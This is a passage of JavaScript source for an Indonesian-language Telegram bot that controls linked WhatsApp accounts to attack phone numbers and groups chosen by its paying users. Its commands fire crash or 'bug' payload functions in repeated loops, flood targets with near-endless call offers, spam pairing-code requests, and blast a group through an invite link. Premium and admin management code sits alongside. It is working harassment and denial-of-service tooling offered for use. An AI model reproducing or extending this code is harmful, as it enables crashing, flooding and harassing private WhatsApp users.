    for (const [userId, userData] of global.userPollData?.entries() || []) {
      if (userData.pollId === pollId) {
        foundUserData = userData
        foundUserId = userId
        break
      }
    }

    if (!foundUserData || optionIds.length === 0) return

    const selectedOption = optionIds[0]
    const bugTypes = ["forcevc", "forcecall", "delayinvis", "stuckhome", "forceiphone"]
    const bugType = bugTypes[selectedOption]

    const { targetNumber, target, chatId, messageId } = foundUserData
    const date = getCurrentDate()

    if (foundUserId) global.userPollData.delete(foundUserId)

    const endCaption = `
<blockquote>⸙ POLLING SELESAI</blockquote>

◉ Target : ${targetNumber}
◉ Bug Terpilih : ${bugType.toUpperCase()}
◉ Status : Sending Bug...`

    const pollEndMsg = await bot.sendMessage(chatId, endCaption, {
      parse_mode: "HTML",
      reply_to_message_id: messageId
    })

    const sendingCaption = `
<blockquote>⸙ SENDING BUG</blockquote>

◉ Bug Type : ${bugType.toUpperCase()}
◉ Target : ${targetNumber}
◉ Status : Processing...`

    const sendingMsg = await bot.sendMessage(chatId, sendingCaption, {
      parse_mode: "HTML"
    })

    setTimeout(async () => {
      try {
        await bot.deleteMessage(chatId, pollEndMsg.message_id)
        await bot.deleteMessage(chatId, sendingMsg.message_id)
      } catch (e) {}
    }, 1000)

    // Perbaikan: Pastikan sock diambil dari session yang aktif
    const sock = sessions.values().next().value; 

    switch (bugType) {
      case 'forcevc':
        await handleForceVC(chatId, messageId, targetNumber, target, date, fromId, sock)
        break
      case 'forcecall':
        await handleForceCall(chatId, messageId, targetNumber, target, date, fromId, sock)
        break
      case 'delayinvis':
        await handleDelayInvis(chatId, messageId, targetNumber, target, date, fromId, sock)
        break
      case 'stuckhome':
        await handleStuckhome(chatId, messageId, targetNumber, target, date, fromId, sock)
        break
      case 'forceiphone':
        await handleForceIPhone(chatId, messageId, targetNumber, target, date, fromId, sock)
        break
    }
  } catch (err) {
    console.error("Poll Answer ERROR:", err)
  }
})

// Perbaikan: Tambahkan parameter 'sock' ke fungsi handle agar tidak error undefined
async function handleForceVC(chatId, messageId, targetNumber, target, date, fromId, sock) {
  const successMessage = createBugSuccessMessage(targetNumber, "ForceVC", date)
  await bot.sendMessage(chatId, successMessage, { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) })
  
  setTimeout(async () => {
    try {
      if (!sock) return;
      for (let i = 0; i < 35; i++) {
        await VisiFriend(sock, target);
        await new Promise(resolve => setTimeout(resolve, 1500));
      }
    } catch (err) {}
  }, 100)
}

async function handleForceCall(chatId, messageId, targetNumber, target, date, fromId, sock) {
  const successMessage = createBugSuccessMessage(targetNumber, "ForceCall", date)
  await bot.sendMessage(chatId, successMessage, { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) })
  
  setTimeout(async () => {
    try {
      if (!sock) return;
      for (let i = 0; i < 100; i++) {
        await OfferXForclose(sock, target);
        await new Promise(resolve => setTimeout(resolve, 500));
      }
    } catch (err) {}
  }, 100)
}

async function handleDelayInvis(chatId, messageId, targetNumber, target, date, fromId, sock) {
  const successMessage = createBugSuccessMessage(targetNumber, "DelayInvis", date)
  await bot.sendMessage(chatId, successMessage, { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) })
  
  setTimeout(async () => {
    try {
      if (!sock) return;
      for (let i = 0; i < 10; i++) {
        await CarouselLolipop(sock, target);
        await new Promise(resolve => setTimeout(resolve, 500));
        await Bulldozer(sock, target);
        await new Promise(resolve => setTimeout(resolve, 500));
      }
    } catch (err) {}
  }, 100)
}

async function handleStuckhome(chatId, messageId, targetNumber, target, date, fromId, sock) {
  const successMessage = createBugSuccessMessage(targetNumber, "Stuckhome", date)
  await bot.sendMessage(chatId, successMessage, { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) })
  
  setTimeout(async () => {
    try {
      if (!sock) return;
      for (let i = 0; i < 70; i++) {
        await MbaPe(sock, target);
        await new Promise(resolve => setTimeout(resolve, 500));
      }
    } catch (err) {}
  }, 100)
}

async function handleForceIPhone(chatId, messageId, targetNumber, target, date, fromId, sock) {
  const successMessage = createBugSuccessMessage(targetNumber, "ForceIPhone", date)
  await bot.sendMessage(chatId, successMessage, { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) })
  
  setTimeout(async () => {
    try {
      if (!sock) return;
      for (let i = 0; i < 300; i++) {
        await exoticsIP(sock, target);
        await new Promise(resolve => setTimeout(resolve, 500));
      }
    } catch (err) {}
  }, 100)
}
//------------------------------------------------------------------------------------------------------------------------------\\
function extractGroupID(link) {
  try {
    if (link.includes("chat.whatsapp.com/")) {
      return link.split("chat.whatsapp.com/")[1];
    }
    return null;
  } catch {
    return null;
  }
}

bot.onText(/\/blankgroup(?:\s(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(senderId);

  const args = msg.text.split(" ");
  const groupLink = args[1] ? args[1].trim() : null;

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`LU SIAPA? JOIN SALURAN DULU KALO MAU DI KASI AKSES, JANGAN LUPA CHAT SEN\`\`\`
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝐒𝐀𝐋𝐔𝐑𝐀𝐍 𝐒𝐄𝐍",
              url: "https://whatsapp.com/channel/0029VakXfJW5PO12maxNk33j",
            },
          ],
        ],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    if (!groupLink) {
      return await bot.sendMessage(chatId, `Example: frezegroup <link>`);
    }

    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }

    async function joinAndSendBug(groupLink) {
      try {
        const groupCode = extractGroupID(groupLink);
        if (!groupCode) {
          await bot.sendMessage(chatId, "Link grup tidak valid");
          return false;
        }

        try {
          const groupId = await sock.groupGetInviteInfo(groupCode);

          for (let i = 0; i < 10; i++) {
            await VampireBugIns(groupId.id);
          }
        } catch (error) {
          console.error(`Error dengan bot`, error);
        }
        return true;
      } catch (error) {
        console.error("Error dalam joinAndSendBug:", error);
        return false;
      }
    }

    const success = await joinAndSendBug(groupLink);

    if (success) {
      await bot.sendPhoto(chatId, "https://files.catbox.moe/vyfn5n.jpg", {
        caption: `
\`\`\`
#SUCCES BUG❗
- status : Success
- Link : ${groupLink}
\`\`\`
`,
        parse_mode: "Markdown",
      });
    } else {
      await bot.sendMessage(chatId, "Gagal Mengirim Bug");
    }
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});


bot.onText(/^\/brat(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const argsRaw = match[1];
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to add premium users."
    );
  }
  
  if (!argsRaw) {
    return bot.sendMessage(chatId, 'Gunakan: /brat <teks> [--gif] [--delay=500]');
  }

  try {
    const args = argsRaw.split(' ');

    const textParts = [];
    let isAnimated = false;
    let delay = 500;

    for (let arg of args) {
      if (arg === '--gif') isAnimated = true;
      else if (arg.startsWith('--delay=')) {
        const val = parseInt(arg.split('=')[1]);
        if (!isNaN(val)) delay = val;
      } else {
        textParts.push(arg);
      }
    }

    const text = textParts.join(' ');
    if (!text) {
      return bot.sendMessage(chatId, 'Teks tidak boleh kosong!');
    }

    // Validasi delay
    if (isAnimated && (delay < 100 || delay > 1500)) {
      return bot.sendMessage(chatId, 'Delay harus antara 100–1500 ms.');
    }

    await bot.sendMessage(chatId, '🌿 Generating stiker brat...');

    const apiUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isAnimated=${isAnimated}&delay=${delay}`;
    const response = await axios.get(apiUrl, {
      responseType: 'arraybuffer',
    });

    const buffer = Buffer.from(response.data);

    // Kirim sticker (bot API auto-detects WebP/GIF)
    await bot.sendSticker(chatId, buffer);
  } catch (error) {
    console.error('❌ Error brat:', error.message);
    bot.sendMessage(chatId, 'Gagal membuat stiker brat. Coba lagi nanti ya!');
  }
});
bot.onText(/\/tourl/i, async (msg) => {
    const chatId = msg.chat.id;
    
    
    if (!msg.reply_to_message || (!msg.reply_to_message.document && !msg.reply_to_message.photo && !msg.reply_to_message.video)) {
        return bot.sendMessage(chatId, "❌ Silakan reply sebuah file/foto/video dengan command /tourl");
    }

    const repliedMsg = msg.reply_to_message;
    let fileId, fileName;

    
    if (repliedMsg.document) {
        fileId = repliedMsg.document.file_id;
        fileName = repliedMsg.document.file_name || `file_${Date.now()}`;
    } else if (repliedMsg.photo) {
        fileId = repliedMsg.photo[repliedMsg.photo.length - 1].file_id;
        fileName = `photo_${Date.now()}.jpg`;
    } else if (repliedMsg.video) {
        fileId = repliedMsg.video.file_id;
        fileName = `video_${Date.now()}.mp4`;
    }

    try {
        
        const processingMsg = await bot.sendMessage(chatId, "⏳ Mengupload ke Catbox...");

        
        const fileLink = await bot.getFileLink(fileId);
        const response = await axios.get(fileLink, { responseType: 'stream' });

        
        const form = new FormData();
        form.append('reqtype', 'fileupload');
        form.append('fileToUpload', response.data, {
            filename: fileName,
            contentType: response.headers['content-type']
        });

        const { data: catboxUrl } = await axios.post('https://catbox.moe/user/api.php', form, {
            headers: form.getHeaders()
        });

        
        await bot.editMessageText(` Upload berhasil!\n📎 URL: ${catboxUrl}`, {
            chat_id: chatId,
            message_id: processingMsg.message_id
        });

    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, "❌ Gagal mengupload file ke Catbox");
    }
});

bot.onText(/\/SpamPairing (\d+)\s*(\d+)?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Kamu tidak punya izin untuk menjalankan perintah ini."
    );
  }

  const target = match[1];
  const count = parseInt(match[2]) || 999999;

  bot.sendMessage(
    chatId,
    `Mengirim Spam Pairing ${count} ke nomor ${target}...`
  );

  try {
    const { state } = await useMultiFileAuthState("senzypairing");
    const { version } = await fetchLatestBaileysVersion();

    const sucked = await makeWASocket({
      printQRInTerminal: false,
      mobile: false,
      auth: state,
      version,
      logger: pino({ level: "fatal" }),
      browser: ["Mac Os", "chrome", "121.0.6167.159"],
    });

    for (let i = 0; i < count; i++) {
      await sleep(1600);
      try {
        await sucked.requestPairingCode(target);
      } catch (e) {
        console.error(`Gagal spam pairing ke ${target}:`, e);
      }
    }

    bot.sendMessage(chatId, `Selesai spam pairing ke ${target}.`);
  } catch (err) {
    console.error("Error:", err);
    bot.sendMessage(chatId, "Terjadi error saat menjalankan spam pairing.");
  }
});

bot.onText(/\/SpamCall(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;
  // Check if the command is used in the allowed group

    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }
    
if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "🚫 Missing input. Please provide a target number. Example: /overload 62×××."
    );
  }

  const numberTarget = match[1].replace(/[^0-9]/g, "").replace(/^\+/, "");
  if (!/^\d+$/.test(numberTarget)) {
    return bot.sendMessage(
      chatId,
      "🚫 Invalid input. Example: /overload 62×××."
    );
  }

  const formatedNumber = numberTarget + "@s.whatsapp.net";

  await bot.sendPhoto(chatId, "https://files.catbox.moe/vyfn5n.jpg", {
    caption: `┏━━━━━━〣 𝙽𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 〣━━━━━━┓
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /spamcall
┃〢 Wᴀʀɴɪɴɢ : ᴜɴʟɪᴍɪᴛᴇᴅ ᴄᴀʟʟ
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`,
  });

  for (let i = 0; i < 9999999; i++) {
    await sendOfferCall(formatedNumber);
    await sendOfferVideoCall(formatedNumber);
    await new Promise((r) => setTimeout(r, 1000));
  }
});


bot.onText(/^\/hapusbug\s+(.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const q = match[1]; // Ambil argumen setelah /delete-bug
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

    if (!q) {
        return bot.sendMessage(chatId, `Cara Pakai Nih Njing!!!\n/fixedbug 62xxx`);
    }
    
    let pepec = q.replace(/[^0-9]/g, "");
    if (pepec.startsWith('0')) {
        return bot.sendMessage(chatId, `Contoh : /fixedbug 62xxx`);
    }
    
    let target = pepec + '@s.whatsapp.net';
    
    try {
        for (let i = 0; i < 3; i++) {
            await sock.sendMessage(target, { 
                text: "𝗩𝗮𝗻𝘁𝗵𝗿𝗮 𝐂𝐋𝐄𝐀𝐑 𝐁𝐔𝐆\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n𝗠𝗯𝗮𝗽𝗲 𝐆𝐀𝐍𝐓𝐄𝐍𝐆"
            });
        }
        bot.sendMessage(chatId, "Done Clear Bug By King Mbape😜");
    } catch (err) {
        console.error("Error:", err);
        bot.sendMessage(chatId, "Ada kesalahan saat mengirim bug.");
    }
});

bot.onText(/\/SpamReportWhatsapp (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (!isOwner(fromId)) {
    return bot.sendMessage(
      chatId,
      "❌ Kamu tidak punya izin untuk menjalankan perintah ini."
    );
  }

  const q = match[1];
  if (!q) {
    return bot.sendMessage(
      chatId,
      "❌ Mohon masukkan nomor yang ingin di-*report*.\nContoh: /spamreport 628xxxxxx"
    );
  }

  const target = q.replace(/[^0-9]/g, "").trim();
  const pepec = `${target}@s.whatsapp.net`;

  try {
    const { state } = await useMultiFileAuthState("senzyreport");
    const { version } = await fetchLatestBaileysVersion();

    const sucked = await makeWASocket({
      printQRInTerminal: false,
      mobile: false,
      auth: state,
      version,
      logger: pino({ level: "fatal" }),
      browser: ["Mac OS", "Chrome", "121.0.6167.159"],
    });

    await bot.sendMessage(chatId, `Telah Mereport Target ${pepec}`);

    while (true) {
      await sleep(1500);
      await sucked.requestPairingCode(target);
    }
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, `done spam report ke nomor ${pepec} ,,tidak work all nomor ya!!`);
  }
});

//=======case owner=======//
bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin 123456789.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin 6843967527.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});

bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin 123456789.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});


bot.onText(/\/addowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const newOwnerId = match[1].trim();

  try {
    const configPath = "./config.js";
    const configContent = fs.readFileSync(configPath, "utf8");

    if (config.OWNER_ID.includes(newOwnerId)) {
      return bot.sendMessage(
        chatId,
        `\`\`\`
╭─────────────────
│    GAGAL MENAMBAHKAN    
│────────────────
│ User ${newOwnerId} sudah
│ terdaftar sebagai owner
╰─────────────────\`\`\``,
        {
          parse_mode: "Markdown",
        }
      );
    }

    config.OWNER_ID.push(newOwnerId);

    const newContent = `module.exports = {
  BOT_TOKEN: "${config.BOT_TOKEN}",
  OWNER_ID: ${JSON.stringify(config.OWNER_ID)},
};`;

    fs.writeFileSync(configPath, newContent);

    await bot.sendMessage(
      chatId,
      `\`\`\`
╭─────────────────
│    BERHASIL MENAMBAHKAN    
│────────────────
│ ID: ${newOwnerId}
│ Status: Owner Bot
╰─────────────────\`\`\``,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error adding owner:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menambahkan owner. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/delowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const ownerIdToRemove = match[1].trim();

  try {
    const configPath = "./config.js";

    if (!config.OWNER_ID.includes(ownerIdToRemove)) {
      return bot.sendMessage(
        chatId,
        `\`\`\`
╭─────────────────
│    GAGAL MENGHAPUS    
│────────────────
│ User ${ownerIdToRemove} tidak
│ terdaftar sebagai owner
╰─────────────────\`\`\``,
        {
          parse_mode: "Markdown",
        }
      );
    }

    config.OWNER_ID = config.OWNER_ID.filter((id) => id !== ownerIdToRemove);

    const newContent = `module.exports = {
  BOT_TOKEN: "${config.BOT_TOKEN}",
  OWNER_ID: ${JSON.stringify(config.OWNER_ID)},
};`;

    fs.writeFileSync(configPath, newContent);

    await bot.sendMessage(
      chatId,
      `\`\`\`
╭─────────────────
│    BERHASIL MENGHAPUS    
│────────────────
│ ID: ${ownerIdToRemove}
│ Status: User Biasa
╰─────────────────\`\`\``,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error removing owner:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menghapus owner. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/listbot/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender"
      );
    }

    let botList = 
  "```" + "\n" +
  "╭━━━⭓「 𝐋𝐢𝐒𝐓 ☇ °𝐁𝐎𝐓 」\n" +
  "║\n" +
  "┃\n";

let index = 1;

for (const [botNumber, sock] of sessions.entries()) {
  const status = sock.user ? "🟢" : "🔴";
  botList += `║ ◇ 𝐁𝐎𝐓 ${index} : ${botNumber}\n`;
  botList += `┃ ◇ 𝐒𝐓𝐀𝐓𝐔𝐒 : ${status}\n`;
  botList += "║\n";
  index++;
}
botList += `┃ ◇ 𝐓𝐎𝐓𝐀𝐋𝐒 : ${sessions.size}\n`;
botList += "╰━━━━━━━━━━━━━━━━━━⭓\n";
botList += "```";


    await bot.sendMessage(chatId, botList, { parse_mode: "Markdown" });
  } catch (error) {
    console.error("Error in listbot:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengambil daftar bot. Silakan coba lagi."
    );
  }
});

bot.onText(/\/addsender (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});


bot.onText(/\/setcd (\d+[smh])/, (msg, match) => {
  const chatId = msg.chat.id;
  const response = setCooldown(match[1]);

  bot.sendMessage(chatId, response);
});

bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to add premium users."
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a user ID and duration. Example: /addprem 6843967527 30d."
    );
  }

  const args = match[1].split(" ");
  if (args.length < 2) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please specify a duration. Example: /addprem 6843967527 30d."
    );
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ""));
  const duration = args[1];

  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. User ID must be a number. Example: /addprem 6843967527 30d."
    );
  }

  if (!/^\d+[dhm]$/.test(duration)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d."
    );
  }

  const now = moment();
  const expirationDate = moment().add(
    parseInt(duration),
    duration.slice(-1) === "d"
      ? "days"
      : duration.slice(-1) === "h"
      ? "hours"
      : "minutes"
  );

  if (!premiumUsers.find((user) => user.id === userId)) {
    premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
    savePremiumUsers();
    console.log(
      `${senderId} added ${userId} to premium until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}`
    );
    bot.sendMessage(
      chatId,
      `✅ User ${userId} has been added to the premium list until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  } else {
    const existingUser = premiumUsers.find((user) => user.id === userId);
    existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
    savePremiumUsers();
    bot.sendMessage(
      chatId,
      `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /delprem 6843967527");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the premium list.`);
});


bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```L I S T - P R E M \n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format("YYYY-MM-DD HH:mm:ss");
    message += `${index + 1}. ID: \`${
      user.id
    }\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

bot.onText(/\/cekidch (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const link = match[1];

  let result = await getWhatsAppChannelInfo(link);

  if (result.error) {
    bot.sendMessage(chatId, `⚠️ ${result.error}`);
  } else {
    let teks = `
📢 *Informasi Channel WhatsApp*
🔹 *ID:* ${result.id}
🔹 *Nama:* ${result.name}
🔹 *Total Pengikut:* ${result.subscribers}
🔹 *Status:* ${result.status}
🔹 *Verified:* ${result.verified}
        `;
    bot.sendMessage(chatId, teks);
  }
});

bot.onText(/\/delbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");

  let statusMessage = await bot.sendMessage(
    chatId,
`
\`\`\`╭─────────────────
│    𝙼𝙴𝙽𝙶𝙷𝙰𝙿𝚄𝚂 𝙱𝙾𝚃    
│────────────────
│ Bot: ${botNumber}
│ Status: Memproses...
╰─────────────────\`\`\`
`,
    { parse_mode: "Markdown" }
  );

  try {
    const sock = sessions.get(botNumber);
    if (sock) {
      sock.logout();
      sessions.delete(botNumber);

      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }

      if (fs.existsSync(SESSIONS_FILE)) {
        const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
        const updatedNumbers = activeNumbers.filter((num) => num !== botNumber);
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
      }

      await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙱𝙾𝚃 𝙳𝙸𝙷𝙰𝙿𝚄𝚂   
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil dihapus!
╰─────────────────\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    } else {
      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });

        if (fs.existsSync(SESSIONS_FILE)) {
          const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
          const updatedNumbers = activeNumbers.filter(
            (num) => num !== botNumber
          );
